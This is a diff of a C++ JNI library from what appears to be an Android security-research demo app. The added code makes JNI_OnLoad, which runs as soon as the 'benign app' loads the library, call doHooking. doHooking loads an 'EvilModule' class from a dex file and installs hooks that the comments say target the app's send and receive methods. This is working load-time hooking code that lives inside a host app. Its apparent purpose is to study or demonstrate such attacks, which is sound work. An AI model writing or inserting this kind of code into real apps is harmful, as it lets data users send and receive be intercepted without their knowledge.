@@ -44,6 +44,9 @@ jclass loadClass(jobject loader, const char *, JNIEnv *env) throw(ClassNotFoundE
 Hook* doInBackgroundHook;
 Hook* onPostExecuteHook;
 static bool hooksAreLoaded = false;
+static jclass evilModuleClass = NULL;
+static jobject evilModuleClassRef = NULL;
+static jobject loaderRef = NULL;
 
 //java.lang.String evil.evil_module.EvilModule.doInBackgroundHook(java.lang.String[])
 unsigned char doInBackgroundHookToNativeTrampoline[] = {
@@ -301,6 +304,10 @@ void setupHooks(JNIEnv* env, jclass evilModuleClass) {
 
 }
 
+/**
+ * Hooks send and receive methods of the benign app
+ * @param env The current JNI environment
+ */
 void doHooking(JNIEnv* env) {
 
     if (hooksAreLoaded) return;
@@ -318,21 +325,20 @@ void doHooking(JNIEnv* env) {
 
 
     jobject loader = createDexClassLoader(evilModulePath.c_str(), env);
-    loader = env->NewGlobalRef(loader);
 
-    jclass evilModuleClass = NULL;
-    jobject evilModuleClassObject = NULL;
-    jobject evilModuleClassWeakRef = NULL;
+    if (loader == NULL) {
+        logE("EVIL_LIB::doHooking", "Couldn't create dex classloader!");
+        return;
+    }
+
+    //make a global ref so that gc doesn't interfere
+    loaderRef = env->NewGlobalRef(loader);
 
     try {
         evilModuleClass = loadClass(loader, "evil.evil_module.EvilModule", env);
-        evilModuleClassObject = (jclass) env->NewGlobalRef(evilModuleClass);
-        evilModuleClassWeakRef = env->NewWeakGlobalRef(evilModuleClass);
 
-       /* int evilModuleClassObjectInt = (int)evilModuleClassObject;
-        logE("evilModuleClassInt", "%i", (int)evilModuleClass);
-        logE("evilModuleClassObjectInt", "%i", evilModuleClassObjectInt);
-        logE("evilModuleClassWeakRef", "%i", evilModuleClassWeakRef);*/
+        //make a global ref so that gc doesn't interfere
+        evilModuleClassRef = env->NewGlobalRef(evilModuleClass);
 
     } catch (ClassNotFoundException e) {
         logE("EVIL_LIB::doHooking", "Couldn't load EvilModule: %s", e.what());
@@ -345,16 +351,6 @@ void doHooking(JNIEnv* env) {
     setupHooks(env, evilModuleClass);
 
     hooksAreLoaded = true;
-}
-
-extern "C"
-JNIEXPORT jstring
-JNICALL
-Java_de_unipassau_fim_reallife_1security_demoapp_demoapp_MainActivity_stringFromJNI(
-        JNIEnv *env,
-        jobject /* this */) {
-    const char* hello = "Hello from C++";
-    return env->NewStringUTF(hello);
 }
 
 
@@ -408,20 +404,35 @@ Java_de_unipassau_fim_reallife_1security_demoapp_demoapp_MainActivity_deactivate
 
 }
 
+extern "C"
+JNIEXPORT jstring
+JNICALL
+Java_de_unipassau_fim_reallife_1security_demoapp_demoapp_MainActivity_stringFromJNI(
+        JNIEnv *env,
+        jobject /* this */) {
+    const char* hello = "Hello from C++";
+    return env->NewStringUTF(hello);
+}
+
+
+/**
+ * Called when the library is loaded by the benign app.
+ * @param vm The JVM
+ * @param reserved nothing important
+ * @return The current JNI version or -1, if an error occured
+ */
 jint JNI_OnLoad(JavaVM* vm, void* reserved)
 {
+    // Get the JNI environment
     JNIEnv* env;
     if (vm->GetEnv(reinterpret_cast<void**>(&env), JNI_VERSION_1_6) != JNI_OK) {
         return -1;
     }
 
+    // Hook the benign app
     doHooking(env);
 
-    //std::remove(evilModulePath.c_str());
     logE("EVIL_LIB::stringFromJNI", "Done");
-
-    // Get jclass with env->FindClass.
-    // Register methods with env->RegisterNatives.
 
     return JNI_VERSION_1_6;
 }
